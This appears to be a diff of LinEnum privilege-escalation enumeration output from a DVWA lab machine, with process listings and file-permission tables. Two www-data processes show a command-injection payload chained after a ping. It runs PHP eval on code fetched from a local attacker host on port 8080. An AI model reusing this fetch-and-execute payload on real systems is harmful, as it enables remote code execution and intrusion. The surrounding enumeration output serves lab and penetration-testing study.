+root         288  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_26]
+root         289  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_27]
+root         290  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_27]
+root         291  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_28]
+root         292  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_28]
+root         293  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_29]
+root         294  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_29]
+root         295  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_30]
+root         296  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_30]
+root         297  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_31]
+root         298  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_31]
+root         343  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/16-vmwgfx]
+root         344  0.0  0.0      0     0 ?        I<   06:54   0:00 [ttm_swap]
+root         345  0.0  0.0      0     0 ?        S    06:54   0:00 [card0-crtc0]
+root         346  0.0  0.0      0     0 ?        S    06:54   0:00 [card0-crtc1]
+root         347  0.0  0.0      0     0 ?        S    06:54   0:00 [card0-crtc2]
+root         348  0.0  0.0      0     0 ?        S    06:54   0:00 [card0-crtc3]
+root         349  0.0  0.0      0     0 ?        S    06:54   0:00 [card0-crtc4]
+root         350  0.0  0.0      0     0 ?        S    06:54   0:00 [card0-crtc5]
+root         351  0.0  0.0      0     0 ?        S    06:54   0:00 [card0-crtc6]
+root         352  0.0  0.0      0     0 ?        S    06:54   0:00 [card0-crtc7]
+root         355  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_32]
+root         356  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_32]
+root         357  0.0  0.0      0     0 ?        I    06:54   0:04 [kworker/3:2-events]
+root         377  0.0  0.0      0     0 ?        I<   06:54   0:00 [kdmflush]
+root         403  0.0  0.0      0     0 ?        I<   06:54   0:00 [raid5wq]
+root         449  0.0  0.0      0     0 ?        S    06:54   0:00 [jbd2/dm-0-8]
+root         450  0.0  0.0      0     0 ?        I<   06:54   0:00 [ext4-rsv-conver]
+root         525  0.0  0.3 122080 30360 ?        S<s  06:54   0:02 /lib/systemd/systemd-journald
+root         556  0.0  0.0  22956  5868 ?        Ss   06:54   0:00 /lib/systemd/systemd-udevd
+root         727  0.0  0.0      0     0 ?        I<   06:54   0:00 [kaluad]
+root         728  0.0  0.0      0     0 ?        I<   06:54   0:00 [kmpath_rdacd]
+root         729  0.0  0.0      0     0 ?        I<   06:54   0:00 [kmpathd]
+root         730  0.0  0.0      0     0 ?        I<   06:54   0:00 [kmpath_handlerd]
+root         731  0.0  0.2 346708 18968 ?        SLsl 06:54   0:04 /sbin/multipathd -d -s
+root         741  0.0  0.0      0     0 ?        S<   06:54   0:00 [loop0]
+root         749  0.0  0.0      0     0 ?        S<   06:54   0:00 [loop1]
+root         753  0.0  0.0      0     0 ?        S    06:54   0:00 [jbd2/sda2-8]
+root         754  0.0  0.0      0     0 ?        I<   06:54   0:00 [ext4-rsv-conver]
+root         756  0.0  0.0      0     0 ?        S<   06:54   0:00 [loop2]
+root         757  0.0  0.0      0     0 ?        S<   06:54   0:00 [loop3]
+root         758  0.0  0.0      0     0 ?        S<   06:54   0:00 [loop4]
+root         759  0.0  0.0      0     0 ?        S<   06:54   0:00 [loop5]
+root         760  0.0  0.0      0     0 ?        S<   06:54   0:00 [loop6]
+systemd+     791  0.0  0.0  88428  6236 ?        Ssl  06:54   0:00 /lib/systemd/systemd-timesyncd
+root         797  0.0  0.1  48408 10352 ?        Ss   06:54   0:00 /usr/bin/VGAuthService
+root         799  0.0  0.1 165780  8252 ?        Ssl  06:54   0:07 /usr/bin/vmtoolsd
+systemd+     871  0.0  0.0  16008  6956 ?        Ss   06:54   0:00 /lib/systemd/systemd-networkd
+systemd+     873  0.0  0.1  24100 12080 ?        Ss   06:54   0:00 /lib/systemd/systemd-resolved
+root         895  0.0  0.0   6884  2964 ?        Ss   06:55   0:00 /usr/sbin/cron -f -P
+message+     896  0.0  0.0   8668  5036 ?        Ss   06:55   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root         903  0.0  0.0  82988  3816 ?        Ssl  06:55   0:00 /usr/sbin/irqbalance --foreground
+root         909  0.0  0.2  31184 19460 ?        Ss   06:55   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+syslog       912  0.0  0.0 221216  5656 ?        Ssl  06:55   0:00 /usr/sbin/rsyslogd -n -iNONE
+root         915  0.0  0.3 1147112 29564 ?       Ssl  06:55   0:03 /usr/lib/snapd/snapd
+root         924  0.0  0.0  13840  7400 ?        Ss   06:55   0:00 /lib/systemd/systemd-logind
+root         930  0.0  0.1 393860 12408 ?        Ssl  06:55   0:00 /usr/libexec/udisks2/udisksd
+root         949  0.0  0.0  13296  7784 ?        Ss   06:55   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+root         954  0.0  0.0   5992  1916 tty1     Ss+  06:55   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root        1008  0.0  0.2 109028 21792 ?        Ssl  06:55   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+mysql       1014  0.0  1.0 1124640 81540 ?       Ssl  06:55   0:01 /usr/sbin/mariadbd
+root        1019  0.0  0.0 234988  7300 ?        Ssl  06:55   0:00 /usr/libexec/polkitd --no-debug
+root        1027  0.0  0.2 205248 20444 ?        Ss   06:55   0:00 /usr/sbin/apache2 -k start
+www-data    1040  0.0  0.2 205660 17360 ?        S    06:55   0:00 /usr/sbin/apache2 -k start
+www-data    1041  0.0  0.1 205660 16108 ?        S    06:55   0:00 /usr/sbin/apache2 -k start
+www-data    1042  0.0  0.1 205660 16104 ?        S    06:55   0:00 /usr/sbin/apache2 -k start
+www-data    1043  0.0  0.1 205724 15528 ?        S    06:55   0:00 /usr/sbin/apache2 -k start
+www-data    1044  0.0  0.1 205692  9312 ?        S    06:55   0:00 /usr/sbin/apache2 -k start
+root        1372  0.0  0.0      0     0 ?        I    07:00   0:01 [kworker/1:0-events]
+www-data    1529  0.0  0.1 205692  9312 ?        S    07:06   0:00 /usr/sbin/apache2 -k start
+root        1549  0.0  0.0      0     0 ?        I    07:06   0:00 [kworker/3:0-events]
+root        1720  0.0  0.0 237800  7808 ?        Ssl  07:06   0:00 /usr/lib/accountsservice/accounts-daemon
+root        1744  0.0  0.2 295936 21296 ?        Ssl  07:06   0:00 /usr/libexec/packagekitd
+root        1892  0.0  0.0      0     0 ?        I    07:06   0:01 [kworker/0:0-events]
+www-data    1927  0.0  0.0   2628   716 ?        S    07:07   0:00 sh -c ping  -c 4 192.168.1.1; php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.1.86:8080/uxEawCZfeHKtsM', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+www-data    1929  0.0  0.2  72948 22088 ?        S    07:07   0:01 php -d allow_url_fopen=true -r eval(file_get_contents('http://192.168.1.86:8080/uxEawCZfeHKtsM', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));
+www-data    2835  0.0  0.0      0     0 ?        Z    07:40   0:00 [sh] <defunct>
+www-data    2846  0.0  0.0      0     0 ?        Z    07:40   0:00 [sh] <defunct>
+www-data    2851  0.0  0.0      0     0 ?        Z    07:40   0:00 [sh] <defunct>
+www-data    2931  0.0  0.0      0     0 ?        Z    07:44   0:00 [sh] <defunct>
+root        5033  0.0  0.0      0     0 ?        I    08:39   0:00 [kworker/u8:0-events_unbound]
+root        5295  0.0  0.0      0     0 ?        I    08:47   0:00 [kworker/0:2-cgroup_destroy]
+root        5446  0.0  0.0      0     0 ?        I    08:48   0:00 [kworker/1:2-events]
+root        5458  0.0  0.1  15108  9128 ?        Ss   08:48   0:00 sshd: dvwa [priv]
+dvwa        5463  0.0  0.1  15448  9044 ?        Ss   08:48   0:00 /lib/systemd/systemd --user
+dvwa        5464  0.0  0.0 168880  4520 ?        S    08:48   0:00 (sd-pam)
+root        5469  0.0  0.0      0     0 ?        I    08:48   0:00 [kworker/2:2]
+dvwa        5536  0.0  0.0  15128  6472 ?        S    08:48   0:00 sshd: dvwa@pts/0
+dvwa        5537  0.0  0.0   8568  5368 pts/0    Ss   08:48   0:00 -bash
+root        5672  0.0  0.0      0     0 ?        I    08:53   0:00 [kworker/u8:1-events_power_efficient]
+root        5803  0.0  0.0      0     0 ?        I    08:58   0:00 [kworker/u8:2-events_unbound]
+root        6124  0.0  0.0      0     0 ?        I    09:02   0:00 [kworker/3:1]
+dvwa        6586  0.0  0.0   8048  4164 pts/0    S+   09:06   0:00 /bin/bash ./LinEnum.sh -r linenum -t
+dvwa        6588  0.4  0.0   8116  3208 pts/0    S+   09:06   0:00 /bin/bash ./LinEnum.sh -r linenum -t
+dvwa        6589  0.0  0.0   5508   768 pts/0    S+   09:06   0:00 tee -a linenum-17-11-21
+dvwa        7025  0.0  0.0   8116  2632 pts/0    S+   09:06   0:00 /bin/bash ./LinEnum.sh -r linenum -t
+dvwa        7026  0.0  0.0   9848  3604 pts/0    R+   09:06   0:00 ps aux
+
+
+[00;31m[-] Process binaries and associated permissions (from above list):[00m
+1.4M -rwxr-xr-x 1 root root 1.4M Mar 19  2021 /bin/bash
+1.7M -rwxr-xr-x 1 root root 1.7M Jul 20 11:38 /lib/systemd/systemd
+164K -rwxr-xr-x 1 root root 163K Jul 20 11:38 /lib/systemd/systemd-journald
+264K -rwxr-xr-x 1 root root 263K Jul 20 11:38 /lib/systemd/systemd-logind
+2.9M -rwxr-xr-x 1 root root 2.9M Jul 20 11:38 /lib/systemd/systemd-networkd
+444K -rwxr-xr-x 1 root root 443K Jul 20 11:38 /lib/systemd/systemd-resolved
+ 56K -rwxr-xr-x 1 root root  55K Jul 20 11:38 /lib/systemd/systemd-timesyncd
+   0 lrwxrwxrwx 1 root root   12 Jul 20 11:38 /lib/systemd/systemd-udevd -> /bin/udevadm
+ 68K -rwxr-xr-x 1 root root  68K Feb 26  2021 /sbin/agetty
+   0 lrwxrwxrwx 1 root root   20 Jul 20 11:38 /sbin/init -> /lib/systemd/systemd
+128K -rwxr-xr-x 1 root root 127K Mar  4  2021 /sbin/multipathd
+   0 lrwxrwxrwx 1 root root    9 Apr  6  2021 /usr/bin/python3 -> python3.9
+140K -rwxr-xr-x 1 root root 139K Mar  8  2021 /usr/bin/VGAuthService
+ 64K -rwxr-xr-x 1 root root  63K Mar  8  2021 /usr/bin/vmtoolsd
+160K -rwxr-xr-x 1 root root 159K Nov  9 12:22 /usr/lib/accountsservice/accounts-daemon
+292K -rwxr-xr-x 1 root root 291K Dec 23  2020 /usr/libexec/packagekitd
+120K -rwxr-xr-x 1 root root 119K May 26 11:46 /usr/libexec/polkitd
+492K -rwxr-xr-x 1 root root 491K Feb 16  2021 /usr/libexec/udisks2/udisksd
+ 21M -rwxr-xr-x 1 root root  21M Mar 30  2021 /usr/lib/snapd/snapd
+724K -rwxr-xr-x 1 root root 721K Sep 28 10:57 /usr/sbin/apache2
+ 56K -rwxr-xr-x 1 root root  55K Mar 15  2021 /usr/sbin/cron
+ 68K -rwxr-xr-x 1 root root  67K Sep  2  2020 /usr/sbin/irqbalance
+ 23M -rwxr-xr-x 1 root root  23M Aug  9 03:59 /usr/sbin/mariadbd
+716K -rwxr-xr-x 1 root root 715K Feb 24  2021 /usr/sbin/rsyslogd
+
+
+[00;31m[-] /etc/init.d/ binary permissions:[00m
+total 152
+drwxr-xr-x  2 root root 4096 Nov  9 04:52 .
+drwxr-xr-x 99 root root 4096 Nov 17 07:06 ..
+-rwxr-xr-x  1 root root 8181 Jan 20  2021 apache2
+-rwxr-xr-x  1 root root 2489 Jan 20  2021 apache-htcacheclean
+-rwxr-xr-x  1 root root 3740 Oct  6  2020 apparmor
+-rwxr-xr-x  1 root root 2964 Mar 24  2021 apport
+-rwxr-xr-x  1 root root 1232 Feb 22  2021 console-setup.sh
+-rwxr-xr-x  1 root root 3062 Mar 15  2021 cron
+-rwxr-xr-x  1 root root  937 Nov  9  2020 cryptdisks
+-rwxr-xr-x  1 root root  896 Nov  9  2020 cryptdisks-early
+-rwxr-xr-x  1 root root 3152 Jul  2  2020 dbus
+-rwxr-xr-x  1 root root  985 Mar 30  2021 grub-common
+-rwxr-xr-x  1 root root 1748 Feb 25  2021 hwclock.sh
+-rwxr-xr-x  1 root root 2638 Dec 13  2019 irqbalance
+-rwxr-xr-x  1 root root 1503 Nov  8  2018 iscsid
+-rwxr-xr-x  1 root root 1479 Feb 19  2021 keyboard-setup.sh
+-rwxr-xr-x  1 root root 2044 Jan  8  2021 kmod
+-rwxr-xr-x  1 root root  695 Feb  8  2021 lvm2
+-rwxr-xr-x  1 root root  586 Feb  8  2021 lvm2-lvmpolld
+-rwxr-xr-x  1 root root 5966 Aug  9 03:59 mariadb
+-rwxr-xr-x  1 root root 2827 Dec 24  2020 multipath-tools
+-rwxr-xr-x  1 root root 2433 Mar 18  2021 open-iscsi
+-rwxr-xr-x  1 root root 1846 Sep 29  2020 open-vm-tools
+-rwxr-xr-x  1 root root 1366 Aug 12  2020 plymouth
+-rwxr-xr-x  1 root root  752 Aug 12  2020 plymouth-log
+-rwxr-xr-x  1 root root  924 May 17  2020 procps
+-rwxr-xr-x  1 root root 4417 Jan 12  2021 rsync
+-rwxr-xr-x  1 root root 2864 Feb 24  2021 rsyslog
+-rwxr-xr-x  1 root root 1222 Apr  2  2017 screen-cleanup
+-rwxr-xr-x  1 root root 4056 Jul 28 13:33 ssh
+-rwxr-xr-x  1 root root 6871 Apr  7  2021 udev
+-rwxr-xr-x  1 root root 2083 Jan 21  2020 ufw
+-rwxr-xr-x  1 root root 1391 Feb 19  2021 unattended-upgrades
+-rwxr-xr-x  1 root root 1306 Feb 26  2021 uuidd
+
+
+[00;31m[-] /lib/systemd/* config file permissions:[00m
+/lib/systemd/:
+total 9.1M
+drwxr-xr-x 27 root root  36K Nov 17 07:06 system
+drwxr-xr-x  2 root root 4.0K Nov  9 03:16 network
+drwxr-xr-x  2 root root 4.0K Nov  9 03:15 catalog
+drwxr-xr-x  4 root root 4.0K Nov  9 03:15 user
+drwxr-xr-x  2 root root 4.0K Nov  9 03:15 user-environment-generators
+drwxr-xr-x  2 root root 4.0K Nov  9 03:15 user-generators
+drwxr-xr-x  2 root root 4.0K Nov  9 03:15 user-preset
+drwxr-xr-x  2 root root 4.0K Nov  9 03:15 system-generators
+drwxr-xr-x  2 root root 4.0K Nov  9 03:15 system-preset
+drwxr-xr-x  2 root root 4.0K Nov  9 03:15 ntp-units.d
+-rw-r--r--  1 root root 2.6M Jul 20 11:38 libsystemd-shared-247.so
+-rwxr-xr-x  1 root root 1.7M Jul 20 11:38 systemd
+-rwxr-xr-x  1 root root  15K Jul 20 11:38 systemd-ac-power
+-rwxr-xr-x  1 root root  31K Jul 20 11:38 systemd-backlight
+-rwxr-xr-x  1 root root  19K Jul 20 11:38 systemd-binfmt
+-rwxr-xr-x  1 root root  31K Jul 20 11:38 systemd-bless-boot
+-rwxr-xr-x  1 root root  15K Jul 20 11:38 systemd-boot-check-no-failures
+-rwxr-xr-x  1 root root  15K Jul 20 11:38 systemd-cgroups-agent
+-rwxr-xr-x  1 root root  43K Jul 20 11:38 systemd-cryptsetup
+-rwxr-xr-x  1 root root  27K Jul 20 11:38 systemd-fsck
+-rwxr-xr-x  1 root root  31K Jul 20 11:38 systemd-fsckd
+-rwxr-xr-x  1 root root  23K Jul 20 11:38 systemd-growfs
+-rwxr-xr-x  1 root root  15K Jul 20 11:38 systemd-hibernate-resume
+-rwxr-xr-x  1 root root  39K Jul 20 11:38 systemd-hostnamed
+-rwxr-xr-x  1 root root  23K Jul 20 11:38 systemd-initctl
+-rwxr-xr-x  1 root root 163K Jul 20 11:38 systemd-journald
+-rwxr-xr-x  1 root root  51K Jul 20 11:38 systemd-localed
+-rwxr-xr-x  1 root root 263K Jul 20 11:38 systemd-logind
+-rwxr-xr-x  1 root root  15K Jul 20 11:38 systemd-makefs
+-rwxr-xr-x  1 root root  19K Jul 20 11:38 systemd-modules-load
+-rwxr-xr-x  1 root root 2.9M Jul 20 11:38 systemd-networkd
+-rwxr-xr-x  1 root root  31K Jul 20 11:38 systemd-networkd-wait-online
+-rwxr-xr-x  1 root root  35K Jul 20 11:38 systemd-network-generator
+-rwxr-xr-x  1 root root  23K Jul 20 11:38 systemd-pstore
+-rwxr-xr-x  1 root root  15K Jul 20 11:38 systemd-quotacheck
+-rwxr-xr-x  1 root root  23K Jul 20 11:38 systemd-random-seed
+-rwxr-xr-x  1 root root  19K Jul 20 11:38 systemd-remount-fs
+-rwxr-xr-x  1 root root  15K Jul 20 11:38 systemd-reply-password
+-rwxr-xr-x  1 root root 443K Jul 20 11:38 systemd-resolved
+-rwxr-xr-x  1 root root  23K Jul 20 11:38 systemd-rfkill
+-rwxr-xr-x  1 root root  59K Jul 20 11:38 systemd-shutdown
+-rwxr-xr-x  1 root root  27K Jul 20 11:38 systemd-sleep
+-rwxr-xr-x  1 root root  31K Jul 20 11:38 systemd-socket-proxyd
+-rwxr-xr-x  1 root root  15K Jul 20 11:38 systemd-sulogin-shell
+-rwxr-xr-x  1 root root  23K Jul 20 11:38 systemd-sysctl
+-rwxr-xr-x  1 root root  47K Jul 20 11:38 systemd-timedated
+-rwxr-xr-x  1 root root  55K Jul 20 11:38 systemd-timesyncd
+-rwxr-xr-x  1 root root  15K Jul 20 11:38 systemd-time-wait-sync
+lrwxrwxrwx  1 root root   12 Jul 20 11:38 systemd-udevd -> /bin/udevadm
+-rwxr-xr-x  1 root root  15K Jul 20 11:38 systemd-update-utmp
+-rwxr-xr-x  1 root root  23K Jul 20 11:38 systemd-user-runtime-dir
+-rwxr-xr-x  1 root root  15K Jul 20 11:38 systemd-user-sessions
+-rwxr-xr-x  1 root root  15K Jul 20 11:38 systemd-veritysetup
+-rwxr-xr-x  1 root root  19K Jul 20 11:38 systemd-volatile-root
+-rwxr-xr-x  1 root root  15K Jul 20 11:38 systemd-xdg-autostart-condition
+-rwxr-xr-x  1 root root 1.4K Jul  6 13:21 systemd-sysv-install
+drwxr-xr-x  2 root root 4.0K Apr 21  2021 logind.conf.d
+drwxr-xr-x  2 root root 4.0K Apr 21  2021 system-sleep
+drwxr-xr-x  2 root root 4.0K Apr 21  2021 system-environment-generators
+drwxr-xr-x  2 root root 4.0K Apr 21  2021 system-shutdown
+drwxr-xr-x  3 root root 4.0K Apr 21  2021 boot
+-rw-r--r--  1 root root  710 Feb  2  2021 resolv.conf
+
+/lib/systemd/system:
+total 1.3M
+-rw-r--r-- 1 root root  741 Nov  9 12:22 accounts-daemon.service
+drwxr-xr-x 2 root root 4.0K Nov  9 04:52 mariadb@bootstrap.service.d
+drwxr-xr-x 2 root root 4.0K Nov  9 03:16 sockets.target.wants
+drwxr-xr-x 2 root root 4.0K Nov  9 03:16 sysinit.target.wants
+drwxr-xr-x 2 root root 4.0K Nov  9 03:15 getty.target.wants
+drwxr-xr-x 2 root root 4.0K Nov  9 03:15 graphical.target.wants
+drwxr-xr-x 2 root root 4.0K Nov  9 03:15 initrd-root-device.target.wants
+drwxr-xr-x 2 root root 4.0K Nov  9 03:15 multi-user.target.wants
+drwxr-xr-x 2 root root 4.0K Nov  9 03:15 rescue.target.wants
+drwxr-xr-x 2 root root 4.0K Nov  9 03:15 timers.target.wants
+drwxr-xr-x 2 root root 4.0K Nov  9 03:15 rc-local.service.d
+drwxr-xr-x 2 root root 4.0K Nov  9 03:15 systemd-localed.service.d
+drwxr-xr-x 2 root root 4.0K Nov  9 03:15 user@.service.d
+drwxr-xr-x 2 root root 4.0K Nov  9 03:15 user-.slice.d
+-rw-r--r-- 1 root root  309 Aug 31 08:36 thermald.service
+-rw-r--r-- 1 root root 5.7K Aug  9 03:59 mariadb.service
+-rw-r--r-- 1 root root 9.8K Aug  9 03:59 mariadb@.service
+lrwxrwxrwx 1 root root   15 Aug  9 03:59 mysqld.service -> mariadb.service
+lrwxrwxrwx 1 root root   15 Aug  9 03:59 mysql.service -> mariadb.service
+-rw-r--r-- 1 root root  184 Jul 28 13:33 rescue-ssh.target
+-rw-r--r-- 1 root root  538 Jul 28 13:33 ssh.service
+-rw-r--r-- 1 root root  318 Jul 28 13:33 ssh@.service
+lrwxrwxrwx 1 root root   14 Jul 20 11:38 autovt@.service -> getty@.service
+-rw-r--r-- 1 root root 1.1K Jul 20 11:38 console-getty.service
+-rw-r--r-- 1 root root 1.3K Jul 20 11:38 container-getty@.service
+lrwxrwxrwx 1 root root    9 Jul 20 11:38 cryptdisks-early.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 20 11:38 cryptdisks.service -> /dev/null
+lrwxrwxrwx 1 root root   13 Jul 20 11:38 ctrl-alt-del.target -> reboot.target
+lrwxrwxrwx 1 root root   25 Jul 20 11:38 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
+lrwxrwxrwx 1 root root   23 Jul 20 11:38 dbus-org.freedesktop.locale1.service -> systemd-localed.service
+lrwxrwxrwx 1 root root   22 Jul 20 11:38 dbus-org.freedesktop.login1.service -> systemd-logind.service
+lrwxrwxrwx 1 root root   25 Jul 20 11:38 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
+-rw-r--r-- 1 root root 1.1K Jul 20 11:38 debug-shell.service
+lrwxrwxrwx 1 root root   16 Jul 20 11:38 default.target -> graphical.target
+-rw-r--r-- 1 root root  805 Jul 20 11:38 emergency.service
+-rw-r--r-- 1 root root 2.0K Jul 20 11:38 getty@.service
+lrwxrwxrwx 1 root root    9 Jul 20 11:38 hwclock.service -> /dev/null
+lrwxrwxrwx 1 root root   28 Jul 20 11:38 kmod.service -> systemd-modules-load.service
+-rw-r--r-- 1 root root  724 Jul 20 11:38 kmod-static-nodes.service
+lrwxrwxrwx 1 root root   22 Jul 20 11:38 procps.service -> systemd-sysctl.service
+-rw-r--r-- 1 root root  617 Jul 20 11:38 quotaon.service
+-rw-r--r-- 1 root root  724 Jul 20 11:38 rc-local.service
+lrwxrwxrwx 1 root root    9 Jul 20 11:38 rc.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul 20 11:38 rcS.service -> /dev/null
+-rw-r--r-- 1 root root  796 Jul 20 11:38 rescue.service
+lrwxrwxrwx 1 root root   15 Jul 20 11:38 runlevel0.target -> poweroff.target
+lrwxrwxrwx 1 root root   13 Jul 20 11:38 runlevel1.target -> rescue.target
+lrwxrwxrwx 1 root root   17 Jul 20 11:38 runlevel2.target -> multi-user.target
+lrwxrwxrwx 1 root root   17 Jul 20 11:38 runlevel3.target -> multi-user.target
+lrwxrwxrwx 1 root root   17 Jul 20 11:38 runlevel4.target -> multi-user.target
+lrwxrwxrwx 1 root root   16 Jul 20 11:38 runlevel5.target -> graphical.target
+lrwxrwxrwx 1 root root   13 Jul 20 11:38 runlevel6.target -> reboot.target
+-rw-r--r-- 1 root root 1.5K Jul 20 11:38 serial-getty@.service
+-rw-r--r-- 1 root root 1.2K Jul 20 11:38 sys-kernel-config.mount
+-rw-r--r-- 1 root root  727 Jul 20 11:38 systemd-backlight@.service
+-rw-r--r-- 1 root root 1.2K Jul 20 11:38 systemd-binfmt.service
+-rw-r--r-- 1 root root  686 Jul 20 11:38 systemd-bless-boot.service
+-rw-r--r-- 1 root root  726 Jul 20 11:38 systemd-boot-check-no-failures.service
+-rw-r--r-- 1 root root  551 Jul 20 11:38 systemd-fsckd.service
+-rw-r--r-- 1 root root  540 Jul 20 11:38 systemd-fsckd.socket
+-rw-r--r-- 1 root root  748 Jul 20 11:38 systemd-fsck-root.service
+-rw-r--r-- 1 root root  749 Jul 20 11:38 systemd-fsck@.service
+-rw-r--r-- 1 root root  676 Jul 20 11:38 systemd-hibernate-resume@.service
+-rw-r--r-- 1 root root  549 Jul 20 11:38 systemd-hibernate.service
+-rw-r--r-- 1 root root 1.2K Jul 20 11:38 systemd-hostnamed.service
+-rw-r--r-- 1 root root  821 Jul 20 11:38 systemd-hwdb-update.service
+-rw-r--r-- 1 root root  567 Jul 20 11:38 systemd-hybrid-sleep.service
+-rw-r--r-- 1 root root  574 Jul 20 11:38 systemd-initctl.service
+-rw-r--r-- 1 root root  694 Jul 20 11:38 systemd-journald-audit.socket
+-rw-r--r-- 1 root root 1.8K Jul 20 11:38 systemd-journald.service
+-rw-r--r-- 1 root root 1.5K Jul 20 11:38 systemd-journald@.service
+-rw-r--r-- 1 root root 1.2K Jul 20 11:38 systemd-localed.service
+-rw-r--r-- 1 root root 2.0K Jul 20 11:38 systemd-logind.service
+-rw-r--r-- 1 root root 1.1K Jul 20 11:38 systemd-modules-load.service
+-rw-r--r-- 1 root root 2.1K Jul 20 11:38 systemd-networkd.service
+-rw-r--r-- 1 root root  748 Jul 20 11:38 systemd-networkd-wait-online.service
+-rw-r--r-- 1 root root  664 Jul 20 11:38 systemd-network-generator.service
+-rw-r--r-- 1 root root  743 Jul 20 11:38 systemd-pstore.service
+-rw-r--r-- 1 root root  663 Jul 20 11:38 systemd-quotacheck.service
+-rw-r--r-- 1 root root 1.1K Jul 20 11:38 systemd-random-seed.service
+-rw-r--r-- 1 root root  775 Jul 20 11:38 systemd-remount-fs.service
+-rw-r--r-- 1 root root 1.8K Jul 20 11:38 systemd-resolved.service
+-rw-r--r-- 1 root root  725 Jul 20 11:38 systemd-rfkill.service
+-rw-r--r-- 1 root root  545 Jul 20 11:38 systemd-suspend.service
+-rw-r--r-- 1 root root  604 Jul 20 11:38 systemd-suspend-then-hibernate.service
+-rw-r--r-- 1 root root  701 Jul 20 11:38 systemd-sysctl.service
+-rw-r--r-- 1 root root 1.2K Jul 20 11:38 systemd-timedated.service
+-rw-r--r-- 1 root root 1.6K Jul 20 11:38 systemd-timesyncd.service
+-rw-r--r-- 1 root root 1.2K Jul 20 11:38 systemd-time-wait-sync.service
+-rw-r--r-- 1 root root 1.2K Jul 20 11:38 systemd-udevd.service
+-rw-r--r-- 1 root root  796 Jul 20 11:38 systemd-udev-trigger.service
+-rw-r--r-- 1 root root  805 Jul 20 11:38 systemd-update-utmp-runlevel.service
+-rw-r--r-- 1 root root  802 Jul 20 11:38 systemd-update-utmp.service
+-rw-r--r-- 1 root root  647 Jul 20 11:38 systemd-user-sessions.service
+-rw-r--r-- 1 root root  721 Jul 20 11:38 systemd-volatile-root.service
+lrwxrwxrwx 1 root root   21 Jul 20 11:38 udev.service -> systemd-udevd.service
+-rw-r--r-- 1 root root  696 Jul 20 11:38 user-runtime-dir@.service
+-rw-r--r-- 1 root root  756 Jul 20 11:38 user@.service
+lrwxrwxrwx 1 root root    9 Jul 20 11:38 x11-common.service -> /dev/null
+-rw-r--r-- 1 root root  366 Jul  6 13:21 getty-static.service
+lrwxrwxrwx 1 root root    9 Apr 21  2021 screen-cleanup.service -> /dev/null
+drwxr-xr-x 2 root root 4.0K Apr 21  2021 system-update.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 21  2021 halt.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 21  2021 initrd-switch-root.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 21  2021 kexec.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 21  2021 poweroff.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 21  2021 reboot.target.wants
+-rw-r--r-- 1 root root  326 Apr 13  2021 apt-daily.service
+-rw-r--r-- 1 root root  156 Apr 13  2021 apt-daily.timer
+-rw-r--r-- 1 root root  389 Apr 13  2021 apt-daily-upgrade.service
+-rw-r--r-- 1 root root  184 Apr 13  2021 apt-daily-upgrade.timer
+drwxr-xr-x 2 root root 4.0K Apr  7  2021 local-fs.target.wants
+drwxr-xr-x 2 root root 4.0K Apr  7  2021 runlevel1.target.wants
+drwxr-xr-x 2 root root 4.0K Apr  7  2021 runlevel2.target.wants
+drwxr-xr-x 2 root root 4.0K Apr  7  2021 runlevel3.target.wants
+drwxr-xr-x 2 root root 4.0K Apr  7  2021 runlevel4.target.wants
+drwxr-xr-x 2 root root 4.0K Apr  7  2021 runlevel5.target.wants
+-rw-r--r-- 1 root root  336 Mar 30  2021 grub-initrd-fallback.service
+-rw-r--r-- 1 root root  530 Mar 30  2021 grub-common.service
+-rw-r--r-- 1 root root  880 Mar 30  2021 snapd.apparmor.service
+-rw-r--r-- 1 root root  432 Mar 30  2021 snapd.autoimport.service
+-rw-r--r-- 1 root root  369 Mar 30  2021 snapd.core-fixup.service
+-rw-r--r-- 1 root root  151 Mar 30  2021 snapd.failure.service
+-rw-r--r-- 1 root root  524 Mar 30  2021 snapd.recovery-chooser-trigger.service
+-rw-r--r-- 1 root root  322 Mar 30  2021 snapd.seeded.service
+-rw-r--r-- 1 root root  475 Mar 30  2021 snapd.service
+-rw-r--r-- 1 root root  464 Mar 30  2021 snapd.snap-repair.service
+-rw-r--r-- 1 root root  373 Mar 30  2021 snapd.snap-repair.timer
+-rw-r--r-- 1 root root  281 Mar 30  2021 snapd.socket
+-rw-r--r-- 1 root root  608 Mar 30  2021 snapd.system-shutdown.service
+-rw-r--r-- 1 root root  406 Mar 26  2021 fwupd-offline-update.service
+-rw-r--r-- 1 root root  404 Mar 26  2021 fwupd-refresh.service
+-rw-r--r-- 1 root root  571 Mar 26  2021 fwupd.service
+-rw-r--r-- 1 root root  159 Mar 24  2021 fwupd-refresh.timer
+-rw-r--r-- 1 root root  212 Mar 24  2021 apport-autoreport.path
